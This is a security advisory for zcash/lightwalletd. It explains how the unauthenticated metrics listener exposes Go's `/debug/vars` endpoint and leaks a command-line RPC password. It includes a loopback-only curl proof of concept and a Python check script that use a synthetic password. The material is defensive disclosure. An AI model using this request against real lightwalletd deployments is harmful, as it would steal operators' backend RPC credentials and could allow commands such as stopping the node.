# GHSA-j79f-98gc-33jw: lightwalletd metrics listener exposes command-line RPC passwords via `/debug/vars`

| Field | Value |
| --- | --- |
| Repo | zcash/lightwalletd |
| GHSA | GHSA-j79f-98gc-33jw |
| CVE | none assigned |
| Severity | medium |
| CWE | CWE-200 |
| Published | 2026-11-18T00:38:19Z |
| Updated | 2026-11-18T00:38:19Z |
| Affected | github.com/zcash/lightwalletd <= 0.6.1 (patched: 0.6.2) |
| Advisory URL | https://github.com/zcash/lightwalletd/security/advisories/GHSA-j79f-98gc-33jw |

## Description (verbatim)

### Summary

The HTTP metrics listener registers `/metrics` on Go's process-wide `http.DefaultServeMux` and starts the server with a `nil` handler. The linked Prometheus library imports the standard `expvar` package, which registers `GET /debug/vars` on that mux and publishes `cmdline` (`os.Args`). An unauthenticated client that can reach the metrics listener can therefore read the process command line, including `--rpcpassword` when an operator supplies the backend RPC password as a CLI flag.

The credential disclosure requires both (1) attacker access to the metrics listener and (2) a password in the process arguments. The listener binds to loopback by default. The repository documents CLI RPC credentials and, separately, a way to expose the HTTP port, but its examples do not combine both conditions in one deployment. We reproduced the disclosure on commit `909dee87` using a synthetic password and loopback-only ports. 

### Details

**Sink — the metrics server uses the default mux with a nil handler.** `cmd/root.go:554-556`:

```go
func startHTTPServer(opts *common.Options) {
	http.Handle("/metrics", promhttp.Handler())
	http.ListenAndServe(opts.HTTPBindAddr, nil)
}
```

`http.Handle` registers on `http.DefaultServeMux`, and `ListenAndServe(addr, nil)` serves that mux. Other handlers registered on the default mux are therefore exposed on the metrics listener.

**Source — `expvar` is linked transitively and self-registers.** `go.mod` pins `github.com/prometheus/client_golang v1.18.0`. Its [`prometheus/expvar_collector.go`](https://github.com/prometheus/client_golang/blob/v1.18.0/prometheus/expvar_collector.go) imports `expvar`; lightwalletd imports `prometheus` in `cmd/connstats.go` and `common/common.go`. With the repository's Go 1.27.3 toolchain, `expvar.init()` normally registers `GET /debug/vars` on `DefaultServeMux` and publishes `cmdline` (which returns `os.Args`) and `memstats`. [Go's `expvar` documentation](https://pkg.go.dev/expvar) describes this behavior. The endpoint is registered as an import side effect; lightwalletd does not explicitly register it.

**What is exposed.** `GET /debug/vars` returns JSON containing the full `cmdline` array and Go runtime `memstats`. The listener has no authentication. `README.md:78` documents supplying `--rpchost`, `--rpcport`, `--rpcuser`, and `--rpcpassword` together. The first two examples in `docs/docker-run.md` use these flags; its third example puts credentials in a YAML file instead of argv.

**Related prior work.** [PR #629](https://github.com/zcash/lightwalletd/pull/629) (commit `107f702`, merged in `909dee87`) redacts the RPC password from the startup debug log. It does not change `os.Args` or the metrics listener; `/debug/vars` still returns CLI-supplied passwords after that fix.

**Deployment context.**
- Default `--http-bind-addr` is `127.0.0.1:9068`: not remotely reachable by default.
- `docker-compose.yml:10-18` binds the listener to `0.0.0.0` inside the container but maps the host port to `127.0.0.1`. `docs/docker-compose-setup.md:126-138` describes changing the host mapping to `0.0.0.0`. This setup reads RPC credentials from `zcash.conf`, so that example alone does not put a password in lightwalletd's argv.
- The two CLI examples in `docs/docker-run.md:10-49` supply `--rpcuser` and `--rpcpassword`, but neither publishes the metrics port. A deployment that combines CLI credentials with a reachable metrics listener is affected.
- `docker/prometheus/config.yml:25-27` scrapes `lightwalletd:9068` over the Compose network. Other containers or actors able to reach that listener may read `/debug/vars`; external access depends on network configuration.

### Proof of concept

All steps use loopback only, a synthetic password, and darkside mode so no Zcash node is needed. No source file is modified.

1. Build the target commit:
   ```sh
   git clone https://github.com/zcash/lightwalletd && cd lightwalletd
   git checkout 909dee87dcc1de876ee536ae1fdb26c005df7a7b
   go build -o lightwalletd .          # go.mod toolchain go1.27.3
   ```
2. Create the log directory, then start the server with a synthetic password on the command line, binding only to loopback:
   ```sh
   mkdir -p /tmp/lwd-poc
   ./lightwalletd --darkside-very-insecure --darkside-timeout 5 \
     --no-tls-very-insecure \
     --grpc-bind-addr 127.0.0.1:19067 \
     --http-bind-addr 127.0.0.1:19068 \
     --data-dir /tmp/lwd-poc --log-file /tmp/lwd-poc/server.log \
     --rpcpassword POC_ONLY_rpcpassword_7f8b2c
   ```
3. From another shell, request the expvar endpoint on the metrics port and inspect the status and command line:
   ```sh
   curl -fsS -D /tmp/lwd-poc/headers.txt \
     -o /tmp/lwd-poc/debug-vars.json http://127.0.0.1:19068/debug/vars
   head -n 1 /tmp/lwd-poc/headers.txt
   jq '.cmdline' /tmp/lwd-poc/debug-vars.json
   ```
4. On `909dee87`, the supplied local check observed HTTP 200 and a 15-element `cmdline` array containing the literal string `POC_ONLY_rpcpassword_7f8b2c`. The JSON endpoint also includes `memstats`. This test does not provide a valid zcashd credential: darkside mode skips backend RPC setup.

Automated check: save the attached `metrics_poc.py` next to the built `lightwalletd` binary and run `python3 metrics_poc.py`. It starts the binary on random loopback ports with the synthetic password, polls `/debug/vars`, checks the response status and password in `cmdline`, and prints
`{"debug_vars_status": 200, "cmdline_contains_synthetic_password": true, "cmdline_arg_count": 15}`
before terminating the server. [Attach `metrics_poc.py` from the bundle; it reports the result without printing a real credential.]

---

metrics_poc.py
```
#!/usr/bin/env python3
import json
import shutil
import socket
import subprocess
import tempfile
import time
import urllib.request
from pathlib import Path

base = Path(__file__).resolve().parent
secret = "POC_ONLY_rpcpassword_7f8b2c"

def free_port():
    sock = socket.socket()
    sock.bind(("127.0.0.1", 0))
    port = sock.getsockname()[1]
    sock.close()
    return port

http_port, grpc_port = free_port(), free_port()
data_dir = Path(tempfile.mkdtemp(prefix="metrics-data-"))
log_path = data_dir / "server.log"
args = [
    str(base / "lightwalletd"),
    "--darkside-very-insecure",
    "--darkside-timeout", "5",
    "--no-tls-very-insecure",
    "--grpc-bind-addr", f"127.0.0.1:{grpc_port}",
    "--http-bind-addr", f"127.0.0.1:{http_port}",
    "--data-dir", str(data_dir),
    "--log-file", str(log_path),
    "--rpcpassword", secret,
]
with log_path.open("w") as log:
    proc = subprocess.Popen(args, cwd=base, stdout=log, stderr=subprocess.STDOUT)
    try:
        url = f"http://127.0.0.1:{http_port}/debug/vars"
        for _ in range(100):
            if proc.poll() is not None:
                raise RuntimeError(f"server exited with {proc.returncode}")
            try:
                with urllib.request.urlopen(url, timeout=1) as response:
                    status = response.status
                    payload = json.load(response)
                if status != 200:
                    raise AssertionError(f"unexpected /debug/vars status: {status}")
                leaked = secret in payload.get("cmdline", [])
                print(json.dumps({
                    "debug_vars_status": status,
                    "cmdline_contains_synthetic_password": leaked,
                    "cmdline_arg_count": len(payload.get("cmdline", [])),
                }))
                if not leaked:
                    raise AssertionError("synthetic password was not found")
                break
            except (OSError, TimeoutError):
                time.sleep(0.1)
        else:
            raise RuntimeError("/debug/vars did not become available")
    finally:
        proc.terminate()
        try:
            proc.wait(timeout=3)
        except subprocess.TimeoutExpired:
            proc.kill()
            proc.wait()
        shutil.rmtree(data_dir, ignore_errors=True)

```

### Impact

**Type.** Unauthenticated disclosure of process arguments, including a CLI-supplied RPC password (CWE-200; the use of a visible process argument also relates to CWE-214).

**Who.** Operators whose metrics listener is reachable by an untrusted client and who pass `--rpcpassword` in the process arguments. A loopback-only listener is not remotely reachable by default. Reading the password from `--zcash-conf-path` instead of argv avoids this particular credential disclosure, though `/debug/vars` still exposes other process arguments and runtime statistics.

**Consequence.** In a normal CLI-credential deployment, `cmd/root.go:217-242` selects the four RPC flags and connects to the backend; `frontend/rpc_client.go:24-32` passes the supplied username and password to that connection. Reuse of the disclosed credential additionally requires attacker access to the backend RPC listener and depends on its network restrictions and enabled methods. Such reuse could permit backend RPC operations, including `stop` on a permissive zcashd configuration. Wallet operations would require a suitable wallet and backend configuration. This PoC demonstrates the credential disclosure only; it does not demonstrate RPC reuse, denial of service, or fund loss.


